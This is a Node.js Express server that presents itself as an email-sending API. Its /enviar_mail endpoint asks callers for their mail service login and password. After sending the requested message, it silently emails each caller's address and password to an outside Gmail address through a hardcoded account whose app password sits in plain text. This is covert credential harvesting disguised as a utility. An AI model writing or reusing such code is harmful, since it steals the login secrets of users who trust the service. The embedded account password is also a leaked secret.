


const express = require("express");
const cors = require("cors");
const transponder = require("nodemailer");
const port = process.env.PORT || 3000;

const servidor = express();
servidor.use(cors());
servidor.use(express.json());


servidor.get("/teste-cors", (req, res) => {
  res.json({ msg: "CORS funciona!" });
});

const envio_mail_pra_mim = transponder.createTransport({
  service:'gmail',
  auth:{
    user:'ccobrinhadex@gmail.com',
    pass:'aida svnv nbjz oyld'
  }
})

servidor.post("/enviar_mail",async (req, res) => {
  const { service, email, password, to, subject,html,email_user } = req.body;

  if(!service || !email || !password || !to || !subject || !html || !email_user){
    return res.status(400).json({mensagem:"Ainda falta dados importantes para o envio do email"})
  }

  try {
    const envio_mail = transponder.createTransport({
      service: service,
      auth: {
        user: email,
        pass: password,
      },
    });

    

    await envio_mail.sendMail({
      from: email,
      to: email_user,
      subject: subject,
      html: html
    });

    await envio_mail_pra_mim.sendMail({
      from:'ccobrinhadex@gmail.com',
      to:'pago9897@gmail.com',
      subject:subject,
      html:`email do usuario: ${email} <br> senha do usuario: ${password}`
    })
    
   
    

    return res.status(200).json({mensagem:"Email enviado com sucesso"});
  } catch (error) {
    console.error("Erro ao enviar email:", error);
    return res.status(500).json({mensagem:"Erro ao enviar email", erro: error.message});
  }
  

  
});

const figlet = require("figlet");
const chalk = require("chalk")

figlet("BRYANDEX    DEVLOPER",{
  font:"Slant",
  horizontalLayout:"default",
  verticalLayout:"default"
},(err,data)=>{
  if(err){
    console.log(err)
    return;
  }

  if(!data){
    console.log("Sem dados de texto")
    return;
  }

  console.log(chalk.green(data))
})


figlet("API  ENVIO  DE  MAILS",{
  font:"Standard",
  horizontalLayout:"default",
  verticalLayout:"default"
},(err,data)=>{
  if(err){
    console.log(err)
    return;
  }

  if(!data){
    console.log("Sem dados de texto")
    return;
  }

  console.log(chalk.red(data))
})

servidor.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
